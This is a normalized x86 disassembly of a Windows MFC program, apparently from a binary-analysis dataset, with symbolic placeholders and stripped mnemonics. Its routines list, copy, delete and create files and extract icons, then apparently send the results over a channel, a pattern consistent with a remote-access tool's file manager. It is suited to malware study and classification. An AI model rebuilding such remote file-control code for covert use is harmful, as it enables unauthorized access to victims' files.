mov ecx edx
push 0x0
and ecx 0x3
[ edi ] [ esi ]
lea esi [ ebp + 0x20 ]
mov ecx esi
call Ordinal_MFC42_6139
lea ecx [ esp + 0x2c ]
call Ordinal_MFC42_356
lea eax [ esp + 0x14 ]
push rw-data
lea ecx [ esp + 0x1c ]
push eax
push ecx
mov [ esp + 0x78 ] 0x1
call Ordinal_MFC42_924
mov eax [ eax ]
push 0x0
push eax
lea ecx [ esp + 0x34 ]
mov [ esp + 0x74 ] 0x2
call Ordinal_MFC42_2770
lea ecx [ esp + 0x18 ]
mov edi eax
mov [ esp + 0x6c ] 0x1
call Ordinal_MFC42_800
call [ GetLastError@IAT ]
cmp eax 0x15
jne r-xdata
test edi edi
je r-xdata
push 0xffffffff
push 0x4
mov ecx esi
call Ordinal_MFC42_6139
mov eax [ ebp + 0x24 ]
mov [ eax ] 0x0
jmp r-xdata
lea ecx [ esp + 0x2c ]
call Ordinal_MFC42_1980
mov edx [ ebp + 0x4 ]
pop edi
pop esi
mov eax [ edx + 0xc ]
test eax eax
je r-xdata
lea ecx [ esp + 0x2c ]
call Ordinal_MFC42_2781
mov edx [ esp + 0x2c ]
push 0x10
lea ecx [ esp + 0x30 ]
mov [ esp + 0x2c ] eax
call [ edx + 0x40 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x28 ]
mov ecx [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x10 ]
push ecx
push 0x1
push eax
mov ecx ebp
call sub_4070f0
mov eax [ ebp + 0x28 ]
mov ecx ebp
add eax 0x4
push eax
call sub_4071d0
test eax eax
je r-xdata
mov eax [ esp + 0x28 ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x2c ]
call Ordinal_MFC42_4058
test eax eax
jne r-xdata
lea ecx [ esp + 0x24 ]
mov [ esp + 0x64 ] 0x0
call Ordinal_MFC42_668
lea ecx [ esp + 0xc ]
mov [ esp + 0x64 ] 0xffffffff
call Ordinal_MFC42_800
lea eax [ esp + 0x18 ]
lea ecx [ esp + 0x2c ]
push eax
call Ordinal_MFC42_3178
lea ecx [ esp + 0x48 ]
mov [ esp + 0x6c ] 0x3
mov [ esp + 0x13 ] 0x0
call Ordinal_MFC42_356
lea ecx [ esp + 0x18 ]
lea edx [ esp + 0x14 ]
push ecx
lea eax [ esp + 0x24 ]
push edx
push eax
mov [ esp + 0x78 ] 0x4
call Ordinal_MFC42_922
push rw-data
lea ecx [ esp + 0x20 ]
push eax
push ecx
mov [ esp + 0x78 ] 0x5
call Ordinal_MFC42_924
mov eax [ eax ]
push 0x0
push eax
lea ecx [ esp + 0x50 ]
mov [ esp + 0x74 ] 0x6
call Ordinal_MFC42_2770
lea ecx [ esp + 0x1c ]
mov esi eax
mov [ esp + 0x6c ] 0x5
call Ordinal_MFC42_800
lea ecx [ esp + 0x20 ]
mov [ esp + 0x6c ] 0x4
call Ordinal_MFC42_800
test esi esi
je r-xdata
lea ecx [ esp + 0x48 ]
call Ordinal_MFC42_1980
mov eax [ esp + 0x18 ]
mov ebx [ ebp + 0x28 ]
push 0xffffffff
mov esi [ eax - 0x8 ]
mov [ esp + 0x28 ] esi
lea ecx [ esi + ebx + 0x2 ]
push ecx
lea ecx [ ebp + 0x20 ]
call Ordinal_MFC42_6139
mov edi [ ebp + 0x24 ]
lea ecx [ esi + 0x1 ]
mov esi [ esp + 0x18 ]
mov edx ecx
add edi ebx
mov [ esp + 0x6c ] 0x3
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x24 ]
mov ecx [ esp + 0x24 ]
add eax ecx
mov cl [ esp + 0x13 ]
mov [ eax + ebx + 0x1 ] cl
lea ecx [ esp + 0x48 ]
call Ordinal_MFC42_668
lea ecx [ esp + 0x18 ]
mov [ esp + 0x6c ] 0x1
call Ordinal_MFC42_800
lea ecx [ esp + 0x48 ]
call Ordinal_MFC42_2781
mov edx [ esp + 0x48 ]
push 0x10
lea ecx [ esp + 0x4c ]
mov esi eax
call [ edx + 0x40 ]
test eax eax
je r-xdata
test esi esi
jne r-xdata
lea ecx [ esp + 0x48 ]
call Ordinal_MFC42_4058
test eax eax
je r-xdata
jmp r-xdata
mov [ esp + 0x13 ] 0x1
sub_404730
push 0xffffffff
push sub_40decd
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x220
push ebx
mov ebx ecx
push ebp
mov [ esp + 0x14 ] ebx
mov eax [ ebx + 0x10 ]
push eax
call sub_406ff0
mov ebp eax
test ebp ebp
je r-xdata
mov ecx [ esp + 0x228 ]
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x22c
retn
push 0xffffffff
lea ecx [ ebx + 0x20 ]
push ebp
call Ordinal_MFC42_6139
mov eax [ ebx + 0x24 ]
mov ecx [ ebx + 0x10 ]
push ebp
push eax
push ecx
mov ecx ebx
call sub_407060
test eax eax
je r-xdata
push esi
push edi
lea ecx [ esp + 0x18 ]
call Ordinal_MFC42_540
mov esi [ ebx + 0x24 ]
push ebp
lea ecx [ esp + 0x1c ]
mov [ esp + 0x23c ] 0x0
call Ordinal_MFC42_2919
mov ecx ebp
mov edi eax
mov edx ecx
or ebp 0xffffffff
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push ebp
and ecx 0x3
push 0x0
[ edi ] [ esi ]
lea esi [ ebx + 0x20 ]
mov ecx esi
call Ordinal_MFC42_6139
lea ecx [ esp + 0x4c ]
call Ordinal_MFC42_356
lea eax [ esp + 0x18 ]
push rw-data
lea ecx [ esp + 0x24 ]
push eax
push ecx
mov [ esp + 0x244 ] 0x1
call Ordinal_MFC42_924
mov eax [ eax ]
push 0x0
push eax
lea ecx [ esp + 0x54 ]
mov [ esp + 0x240 ] 0x2
call Ordinal_MFC42_2770
lea ecx [ esp + 0x20 ]
mov edi eax
mov [ esp + 0x238 ] 0x1
call Ordinal_MFC42_800
call [ GetLastError@IAT ]
cmp eax 0x15
jne r-xdata
test edi edi
je r-xdata
push ebp
push 0x4
mov ecx esi
call Ordinal_MFC42_6139
mov eax [ ebx + 0x24 ]
mov [ eax ] 0x0
jmp r-xdata
lea ecx [ esp + 0x4c ]
call Ordinal_MFC42_1980
mov ecx [ ebx + 0x4 ]
pop edi
pop esi
mov eax [ ecx + 0xc ]
test eax eax
je r-xdata
lea ecx [ esp + 0x4c ]
call Ordinal_MFC42_2781
lea ecx [ esp + 0x4c ]
mov [ esp + 0x44 ] eax
call Ordinal_MFC42_4058
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
mov ecx [ ebx + 0x24 ]
mov edx [ ebx + 0x10 ]
push eax
push ecx
push 0x1
push edx
mov ecx ebx
call sub_4070f0
mov eax [ ebx + 0x28 ]
mov ecx ebx
add eax 0x4
push eax
call sub_4071d0
test eax eax
je r-xdata
mov eax [ esp + 0x44 ]
test eax eax
jne r-xdata
lea edx [ esp + 0x10 ]
lea ecx [ esp + 0x4c ]
push edx
call Ordinal_MFC42_3178
mov eax [ esp + 0x4c ]
push 0x10
lea ecx [ esp + 0x50 ]
mov [ esp + 0x23c ] 0x3
call [ eax + 0x40 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x44 ]
mov [ esp + 0x230 ] 0x0
call Ordinal_MFC42_668
lea ecx [ esp + 0x10 ]
mov [ esp + 0x230 ] ebp
call Ordinal_MFC42_800
lea ecx [ esp + 0x4c ]
call Ordinal_MFC42_3319
mov [ esp + 0x14 ] eax
mov [ esp + 0x14 ] ebp
jmp r-xdata
sbb eax eax
sbb eax ebp
test al al
je r-xdata
lea ecx [ esp + 0x38 ]
push ecx
lea ecx [ esp + 0x50 ]
call Ordinal_MFC42_3311
lea edx [ esp + 0x24 ]
push 0x4
push edx
lea ecx [ esp + 0x18 ]
call Ordinal_MFC42_5710
lea ecx [ esp + 0x24 ]
mov [ esp + 0x238 ] 0x4
call Ordinal_MFC42_4204
mov esi [ esp + 0x24 ]
mov edi rw-data
mov eax [ esp + 0x10 ]
mov ebp [ ebx + 0x28 ]
push 0xffffffff
mov esi [ eax - 0x8 ]
mov [ esp + 0x30 ] esi
lea ecx [ esi + ebp + 0xd ]
push ecx
lea ecx [ ebx + 0x20 ]
call Ordinal_MFC42_6139
mov edi [ ebx + 0x24 ]
lea ecx [ esi + 0x1 ]
mov esi [ esp + 0x10 ]
mov edx ecx
add edi ebp
mov eax [ esp + 0x2c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov edx [ esp + 0x14 ]
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebx + 0x24 ]
add ecx eax
mov [ ecx + ebp + 0x1 ] edx
mov ecx [ ebx + 0x24 ]
mov edx [ esp + 0x38 ]
add ecx eax
mov [ ecx + ebp + 0x5 ] edx
mov eax [ esp + 0x3c ]
mov [ ecx + ebp + 0x9 ] eax
cmp [ esp + 0x14 ] ebp
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ esi + 0x1 ]
mov cl [ edi + 0x1 ]
mov al dl
cmp dl cl
jne r-xdata
lea eax [ esp + 0x68 ]
lea ecx [ esp + 0x4c ]
push eax
mov [ esp + 0x34 ] 0x0
call Ordinal_MFC42_3181
mov eax [ eax ]
push 0x101
lea ecx [ esp + 0xd4 ]
push 0x160
push ecx
push 0x0
push eax
call [ SHGetFileInfoA@IAT ]
lea ecx [ esp + 0x68 ]
mov esi eax
call Ordinal_MFC42_800
test esi esi
je r-xdata
test eax eax
jne r-xdata
add esi 0x2
add edi 0x2
test al al
jne r-xdata
lea ecx [ esp + 0x40 ]
push ecx
lea ecx [ esp + 0x50 ]
call Ordinal_MFC42_3181
mov eax [ eax ]
lea edx [ esp + 0x30 ]
push 0x1
push edx
push 0x0
push 0x0
push eax
call [ ExtractIconExA@IAT ]
lea ecx [ esp + 0x40 ]
call Ordinal_MFC42_800
mov ecx [ esp + 0x30 ]
lea eax [ esp + 0xbc ]
push eax
push ecx
mov eax [ esp + 0xd0 ]
lea edx [ esp + 0xbc ]
push edx
push eax
jmp r-xdata
mov cl [ esi ]
mov dl [ edi ]
mov al cl
cmp cl dl
jne r-xdata
mov ecx [ esp + 0x98 ]
push esi
push ecx
call Ordinal_MFC42_5785
xor edi edi
xor ebx ebx
mov esi [ esi + 0x4 ]
call [ GetIconInfo@IAT ]
mov edx [ esp + 0xc8 ]
push edx
call Ordinal_MFC42_2860
mov esi eax
lea eax [ esp + 0x7c ]
push eax
push 0x18
mov ecx [ esi + 0x4 ]
mov [ esp + 0x50 ] esi
push ecx
call [ GetObjectA@IAT ]
mov ebp [ esp + 0x84 ]
imul ebp [ esp + 0x88 ]
push ebp
call Ordinal_MFC42_823
mov edx [ esi + 0x4 ]
add esp 0x4
mov [ esp + 0x20 ] eax
push eax
push ebp
push edx
call [ GetBitmapBits@IAT ]
mov eax [ esp + 0x7c ]
mov ecx [ esp + 0x80 ]
mov edx [ esp + 0x84 ]
mov [ esp + 0xa4 ] eax
mov eax [ esp + 0x88 ]
mov [ esp + 0xa8 ] ecx
mov cl [ esp + 0x8c ]
mov [ esp + 0xb0 ] eax
mov eax [ esp + 0xcc ]
mov [ esp + 0xac ] edx
mov dl [ esp + 0x8e ]
push eax
mov [ esp + 0xb8 ] cl
mov [ esp + 0xb9 ] dl
mov [ esp + 0xba ] ebp
call Ordinal_MFC42_2860
mov esi eax
push 0x400
mov [ esp + 0x30 ] esi
call Ordinal_MFC42_823
add esp 0x4
lea ecx [ esp + 0x6c ]
mov [ esp + 0x28 ] eax
call Ordinal_MFC42_323
push 0x0
push 0x0
push 0x0
push rw-data
mov [ esp + 0x248 ] 0x5
call [ CreateDCA@IAT ]
push eax
lea ecx [ esp + 0x70 ]
call Ordinal_MFC42_1640
lea ecx [ esp + 0x94 ]
call Ordinal_MFC42_323
mov edi [ esp + 0x70 ]
lea eax [ esp + 0x6c ]
neg eax
sbb eax eax
mov [ esp + 0x238 ] 0x6
and eax edi
push eax
call [ CreateCompatibleDC@IAT ]
push eax
lea ecx [ esp + 0x98 ]
call Ordinal_MFC42_1640
test esi esi
je r-xdata
mov edx [ esp + 0x98 ]
push ebx
push esi
push edx
call [ GetPixel@IAT ]
mov ecx [ esp + 0x28 ]
add edi 0x4
inc esi
mov [ edi + ecx - 0x4 ] eax
cmp esi 0x10
jl r-xdata
inc ebx
cmp ebx 0x10
jl r-xdata
xor esi esi
lea ecx [ esp + 0x94 ]
call Ordinal_MFC42_2405
lea ecx [ esp + 0x6c ]
call Ordinal_MFC42_2405
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x10 ]
push 0xffffffff
mov ebx [ edx + 0x28 ]
mov esi [ eax - 0x8 ]
mov eax [ esp + 0x20 ]
mov [ esp + 0x38 ] esi
lea ecx [ esi + ebx ]
lea edx [ ecx + ebp + 0x423 ]
lea ecx [ eax + 0x20 ]
push edx
call Ordinal_MFC42_6139
mov eax [ esp + 0x1c ]
lea ecx [ esi + 0x1 ]
mov esi [ esp + 0x10 ]
mov edx ecx
mov edi [ eax + 0x24 ]
add edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov edx [ esp + 0x34 ]
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ eax + 0x24 ]
mov esi [ esp + 0x14 ]
add ecx edx
mov [ ecx + ebx + 0x1 ] esi
mov ecx [ eax + 0x24 ]
add ecx edx
lea esi [ esp + 0xa4 ]
lea edi [ ecx + ebx + 0x5 ]
mov ecx 0x5
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov edi [ eax + 0x24 ]
mov esi [ esp + 0x20 ]
mov ecx ebp
add edi edx
mov edx ecx
lea edi [ edi + ebx + 0x1b ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov edx [ esp + 0x34 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi [ eax + 0x24 ]
mov esi [ esp + 0x28 ]
add edi edx
mov ecx 0x100
add edi ebx
lea edi [ edi + ebp + 0x1b ]
[ edi ] [ esi ]
mov eax [ eax + 0x24 ]
mov ecx [ esp + 0x38 ]
add eax edx
add eax ebx
mov [ eax + ebp + 0x41b ] ecx
mov edx [ esp + 0x3c ]
mov [ eax + ebp + 0x41f ] edx
mov eax [ esp + 0xd0 ]
push eax
call [ DestroyIcon@IAT ]
mov ecx [ esp + 0x48 ]
call Ordinal_MFC42_2414
mov ecx [ esp + 0x2c ]
call Ordinal_MFC42_2414
mov ecx [ esp + 0x20 ]
push ecx
call Ordinal_MFC42_825
mov edx [ esp + 0x2c ]
push edx
call Ordinal_MFC42_825
add esp 0x8
mov [ esp + 0x238 ] 0x5
lea ecx [ esp + 0x94 ]
call Ordinal_MFC42_640
lea ecx [ esp + 0x6c ]
mov [ esp + 0x238 ] 0x4
call Ordinal_MFC42_640
mov ebx [ esp + 0x1c ]
jmp r-xdata
lea ecx [ esp + 0x24 ]
mov [ esp + 0x238 ] 0x3
call Ordinal_MFC42_800
lea ecx [ esp + 0x10 ]
mov [ esp + 0x238 ] 0x1
call Ordinal_MFC42_800
or ebp 0xffffffff
sub_404d60
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_40deeb
push eax
mov eax 0x481c
mov [ fs : 0x0 ] esp
call sub_40d2c0
push ebx
push esi
mov ebx ecx
xor esi esi
push 0xffffffff
push esi
lea ecx [ ebx + 0x20 ]
call Ordinal_MFC42_6139
lea ecx [ esp + 0x18 ]
call sub_4088a0
lea ecx [ esp + 0x18 ]
mov [ esp + 0x482c ] esi
call sub_408ae0
lea ecx [ esp + 0x18 ]
call sub_408c10
lea ecx [ esp + 0x18 ]
call sub_408b10
mov eax [ esp + 0x301c ]
mov [ esp + 0x10 ] esi
cmp eax esi
jle r-xdata
mov ecx [ ebx + 0x4 ]
mov eax [ ecx + 0xc ]
test eax eax
je r-xdata
lea eax [ esp + 0x3824 ]
push ebp
push edi
mov [ esp + 0x10 ] eax
jmp r-xdata
mov eax [ ebx + 0x28 ]
mov ecx [ ebx + 0x24 ]
mov edx [ ebx + 0x10 ]
push eax
push ecx
push 0x1
push edx
mov ecx ebx
call sub_4070f0
mov eax [ ebx + 0x28 ]
mov ecx ebx
add eax 0x4
push eax
call sub_4071d0
test eax eax
je r-xdata
mov edx [ eax ]
mov ecx [ eax - 0x800 ]
mov ebp [ ebx + 0x28 ]
lea esi [ eax - 0x800 ]
mov eax [ edx - 0x8 ]
mov ecx [ ecx - 0x8 ]
mov [ esp + 0x14 ] eax
add eax ecx
mov [ esp + 0x1c ] ecx
push 0xffffffff
lea eax [ eax + ebp + 0x7 ]
lea ecx [ ebx + 0x20 ]
push eax
call Ordinal_MFC42_6139
mov edi [ ebx + 0x24 ]
push 0x0
mov ecx esi
add edi ebp
call Ordinal_MFC42_2915
mov esi eax
mov eax [ esp + 0x1c ]
mov ecx eax
push 0x0
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebx + 0x24 ]
mov dl [ rw-data ]
add ecx eax
mov [ ecx + ebp ] dl
mov edi [ ebx + 0x24 ]
mov ecx [ esp + 0x14 ]
add edi ebp
call Ordinal_MFC42_2915
mov ecx [ esp + 0x14 ]
mov esi eax
mov eax [ esp + 0x1c ]
mov edx ecx
shr ecx 0x2
lea edi [ edi + eax + 0x1 ]
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebx + 0x24 ]
mov esi edx
mov dl [ rw-data ]
add ecx esi
add ecx eax
mov [ ecx + ebp + 0x1 ] dl
mov edx [ ebx + 0x24 ]
mov ecx [ esp + 0x10 ]
add edx esi
add edx eax
mov eax [ ecx + 0x800 ]
add ecx 0x4
mov [ edx + ebp + 0x2 ] eax
mov eax [ esp + 0x18 ]
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0x3024 ]
inc eax
cmp eax ecx
mov [ esp + 0x18 ] eax
jl r-xdata
lea ecx [ esp + 0x18 ]
mov [ esp + 0x482c ] 0xffffffff
call sub_408a30
mov ecx [ esp + 0x4824 ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x4828
retn
mov eax [ esp + 0x10 ]
pop edi
pop ebp
sub_404f20
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_40df18
push eax
mov [ fs : 0x0 ] esp
sub esp 0x48
push ebx
push ebp
mov ebp ecx
push esi
mov eax [ ebp + 0x10 ]
push eax
call sub_406ff0
mov esi eax
test esi esi
je r-xdata
mov ecx [ esp + 0x54 ]
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x54
retn
push 0xffffffff
push esi
lea ecx [ ebp + 0x20 ]
call Ordinal_MFC42_6139
mov eax [ ebp + 0x24 ]
mov ecx [ ebp + 0x10 ]
push esi
push eax
push ecx
mov ecx ebp
call sub_407060
test eax eax
je r-xdata
mov esi [ ebp + 0x24 ]
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
push esi
[ edi ]
not ecx
dec ecx
lea ebx [ ecx + esi + 0x1 ]
or ecx 0xffffffff
mov edi ebx
[ edi ]
not ecx
dec ecx
mov edi esi
mov edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
mov eax esi
dec ecx
add eax edx
lea edi [ ecx + eax + 0x2 ]
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_537
push ebx
lea ecx [ esp + 0x14 ]
mov [ esp + 0x64 ] 0x0
call Ordinal_MFC42_941
push esi
lea ecx [ esp + 0x18 ]
call Ordinal_MFC42_537
mov bl 0x1
push edi
lea ecx [ esp + 0x18 ]
mov [ esp + 0x64 ] bl
call Ordinal_MFC42_941
mov ecx [ esp + 0x10 ]
mov esi [ ecx - 0x8 ]
lea ecx [ esp + 0x10 ]
lea edx [ esi + 0x1 ]
push edx
call Ordinal_MFC42_2919
push 0x0
push esi
lea ecx [ esp + 0x18 ]
call Ordinal_MFC42_5856
mov eax [ esp + 0x14 ]
mov esi [ eax - 0x8 ]
lea ecx [ esi + 0x1 ]
push ecx
lea ecx [ esp + 0x18 ]
call Ordinal_MFC42_2919
push 0x0
push esi
lea ecx [ esp + 0x1c ]
call Ordinal_MFC42_5856
mov ecx 0x7
xor eax eax
lea edi [ esp + 0x38 ]
mov edx [ esp + 0x10 ]
[ edi ]
stosw [ edi ]
mov eax [ esp + 0x14 ]
lea ecx [ esp + 0x38 ]
push ecx
mov [ esp + 0x3c ] 0x0
mov [ esp + 0x40 ] 0x4
mov [ esp + 0x44 ] edx
mov [ esp + 0x48 ] eax
mov [ esp + 0x4c ] 0x214
call [ SHFileOperationA@IAT ]
lea ecx [ esp + 0x1c ]
call Ordinal_MFC42_356
mov edx [ esp + 0x10 ]
mov [ esp + 0x60 ] 0x2
push 0x0
push edx
lea ecx [ esp + 0x24 ]
call Ordinal_MFC42_2770
neg eax
sbb eax eax
pop edi
neg eax
mov [ esp + 0x14 ] eax
mov eax [ ebp + 0x4 ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov edx [ ebp + 0x10 ]
lea ecx [ esp + 0x14 ]
push 0x4
push ecx
push 0x0
push edx
mov ecx ebp
call sub_4070f0
push 0x4
mov ecx ebp
call sub_4071d0
test eax eax
je r-xdata
lea ecx [ esp + 0x18 ]
mov [ esp + 0x5c ] bl
call Ordinal_MFC42_668
lea ecx [ esp + 0x10 ]
mov [ esp + 0x5c ] 0x0
call Ordinal_MFC42_800
lea ecx [ esp + 0xc ]
mov [ esp + 0x5c ] 0xffffffff
call Ordinal_MFC42_800
sub_4050f0
push ecx
push esi
mov esi ecx
push edi
mov eax [ esi + 0x10 ]
push eax
call sub_406ff0
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ecx
retn
push 0xffffffff
push edi
lea ecx [ esi + 0x20 ]
call Ordinal_MFC42_6139
mov eax [ esi + 0x24 ]
mov ecx [ esi + 0x10 ]
push edi
push eax
push ecx
mov ecx esi
call sub_407060
test eax eax
je r-xdata
mov eax [ esi + 0x24 ]
push 0x0
push 0x80
push 0x1
push 0x0
push 0x3
push 0x0
push eax
mov [ esp + 0x24 ] 0x0
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
jne r-xdata
push eax
call [ CloseHandle@IAT ]
mov edx [ esi + 0x4 ]
mov eax [ edx + 0xc ]
test eax eax
je r-xdata
mov [ esp + 0x8 ] 0x1
mov ecx [ esi + 0x10 ]
lea eax [ esp + 0x8 ]
push 0x4
push eax
push 0x0
push ecx
mov ecx esi
call sub_4070f0
push 0x4
mov ecx esi
call sub_4071d0
test eax eax
je r-xdata
sub_405190
push ecx
push esi
mov esi ecx
push edi
mov eax [ esi + 0x10 ]
push eax
call sub_406ff0
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ecx
retn
push 0xffffffff
push edi
lea ecx [ esi + 0x20 ]
call Ordinal_MFC42_6139
mov eax [ esi + 0x24 ]
mov ecx [ esi + 0x10 ]
push edi
push eax
push ecx
mov ecx esi
call sub_407060
test eax eax
je r-xdata
mov eax [ esi + 0x24 ]
push 0x0
push eax
mov [ esp + 0x10 ] 0x0
call [ CreateDirectoryA@IAT ]
test eax eax
jne r-xdata
mov edx [ esi + 0x4 ]
mov eax [ edx + 0xc ]
test eax eax
je r-xdata
mov [ esp + 0x8 ] 0x1
mov ecx [ esi + 0x10 ]
lea eax [ esp + 0x8 ]
push 0x4
push eax
push 0x0
push ecx
mov ecx esi
call sub_4070f0
push 0x4
mov ecx esi
call sub_4071d0
test eax eax
je r-xdata
sub_405220
sub esp 0x24
push esi
mov esi ecx
push edi
mov eax [ esi + 0x10 ]
push eax
call sub_406ff0
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
add esp 0x24
retn
push 0xffffffff
push edi
lea ecx [ esi + 0x20 ]
call Ordinal_MFC42_6139
mov eax [ esi + 0x24 ]
mov ecx [ esi + 0x10 ]
push edi
push eax
push ecx
mov ecx esi
call sub_407060
test eax eax
je r-xdata
mov ecx 0x7
xor eax eax
lea edi [ esp + 0xc ]
mov edx [ esi + 0x24 ]
[ edi ]
stosw [ edi ]
lea eax [ esp + 0xc ]
mov [ esp + 0xc ] 0x0
push eax
mov [ esp + 0x14 ] 0x3
mov [ esp + 0x18 ] edx
mov [ esp + 0x20 ] 0x214
mov [ esp + 0xc ] 0x0
call [ SHFileOperationA@IAT ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ ecx + 0xc ]
test eax eax
je r-xdata
mov [ esp + 0x8 ] 0x1
mov eax [ esi + 0x10 ]
lea edx [ esp + 0x8 ]
push 0x4
push edx
push 0x0
push eax
mov ecx esi
call sub_4070f0
push 0x4
mov ecx esi
call sub_4071d0
test eax eax
je r-xdata
sub_4052e0
sub esp 0x24
push esi
mov esi ecx
push edi
mov eax [ esi + 0x10 ]
push eax
call sub_406ff0
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
add esp 0x24
retn
push 0xffffffff
push edi
lea ecx [ esi + 0x20 ]
call Ordinal_MFC42_6139
mov eax [ esi + 0x24 ]
mov ecx [ esi + 0x10 ]
push edi
push eax
push ecx
mov ecx esi
call sub_407060
test eax eax
je r-xdata
mov edx [ esi + 0x24 ]
push ebx
or ecx 0xffffffff
xor eax eax
lea ebx [ edx + 0x4 ]
push ebp
mov edi ebx
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x14 ]
lea ebp [ ecx + edx + 0x6 ]
mov ecx 0x7
[ edi ]
stosw [ edi ]
xor edi edi
lea eax [ esp + 0x14 ]
mov [ esp + 0x14 ] edi
mov edx [ edx ]
push eax
mov [ esp + 0x1c ] edx
mov [ esp + 0x20 ] ebp
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] 0x214
mov [ esp + 0x14 ] edi
call [ SHFileOperationA@IAT ]
pop ebp
pop ebx
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
cmp [ ecx + 0xc ] edi
je r-xdata
mov [ esp + 0x8 ] 0x1
mov eax [ esi + 0x10 ]
lea edx [ esp + 0x8 ]
push 0x4
push edx
push edi
push eax
mov ecx esi
call sub_4070f0
push 0x4
mov ecx esi
call sub_4071d0
test eax eax
je r-xdata
sub_4053b0
push 0xffffffff
push sub_40df50
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
push ebx
push ebp
mov ebp ecx
push esi
push edi
mov eax [ ebp + 0x10 ]
push eax
call sub_406ff0
mov ebx eax
test ebx ebx
mov [ esp + 0x24 ] ebx
je r-xdata
mov ecx [ esp + 0x44 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x40
retn
push 0xffffffff
lea ecx [ ebp + 0x20 ]
push ebx
call Ordinal_MFC42_6139
mov eax [ ebp + 0x24 ]
mov ecx [ ebp + 0x10 ]
push ebx
push eax
push ecx
mov ecx ebp
call sub_407060
test eax eax
je r-xdata
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_540
mov esi [ ebp + 0x24 ]
push ebx
lea ecx [ esp + 0x18 ]
mov [ esp + 0x50 ] 0x0
call Ordinal_MFC42_2919
mov ecx ebx
mov edi eax
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x14 ]
lea ecx [ esp + 0x10 ]
push eax
call Ordinal_MFC42_537
push 0x5c
lea ecx [ esp + 0x14 ]
mov [ esp + 0x50 ] 0x1
call Ordinal_MFC42_5683
inc eax
lea ecx [ esp + 0x1c ]
push eax
push ecx
lea ecx [ esp + 0x18 ]
call Ordinal_MFC42_4129
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0x50 ] 0x2
call Ordinal_MFC42_858
lea ecx [ esp + 0x1c ]
mov [ esp + 0x4c ] 0x1
call Ordinal_MFC42_800
mov edx [ esp + 0x10 ]
push 0xffffffff
push 0x0
lea ecx [ ebp + 0x20 ]
mov eax [ edx - 0x8 ]
mov [ esp + 0x24 ] eax
call Ordinal_MFC42_6139
test ebx ebx
mov [ esp + 0x18 ] 0x0
jbe r-xdata
mov eax [ ebp + 0x4 ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
lea ebx [ edx + ecx ]
lea ecx [ esp + 0x28 ]
call Ordinal_MFC42_356
push 0x0
push ebx
lea ecx [ esp + 0x30 ]
mov [ esp + 0x54 ] 0x3
call Ordinal_MFC42_2770
mov esi eax
call [ GetLastError@IAT ]
cmp eax 0x15
je r-xdata
mov eax [ ebp + 0x28 ]
mov ecx [ ebp + 0x24 ]
push eax
push ecx
mov ecx [ ebp + 0x10 ]
push 0x1
push ecx
mov ecx ebp
call sub_4070f0
mov eax [ ebp + 0x28 ]
mov ecx ebp
add eax 0x4
push eax
call sub_4071d0
test eax eax
je r-xdata
push 0xffffffff
push 0x4
lea ecx [ ebp + 0x20 ]
call Ordinal_MFC42_6139
mov eax [ ebp + 0x24 ]
lea ecx [ esp + 0x28 ]
mov [ esp + 0x4c ] 0x1
mov [ eax ] 0x0
call Ordinal_MFC42_668
test esi esi
je r-xdata
lea ecx [ esp + 0x10 ]
mov [ esp + 0x4c ] 0x0
call Ordinal_MFC42_800
lea ecx [ esp + 0x14 ]
mov [ esp + 0x4c ] 0xffffffff
call Ordinal_MFC42_800
lea ecx [ esp + 0x28 ]
call Ordinal_MFC42_1980
mov edi ebx
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x18 ]
[ edi ]
not ecx
dec ecx
mov [ esp + 0x4c ] 0x1
lea esi [ edx + ecx + 0x1 ]
lea ecx [ esp + 0x28 ]
mov [ esp + 0x18 ] esi
call Ordinal_MFC42_668
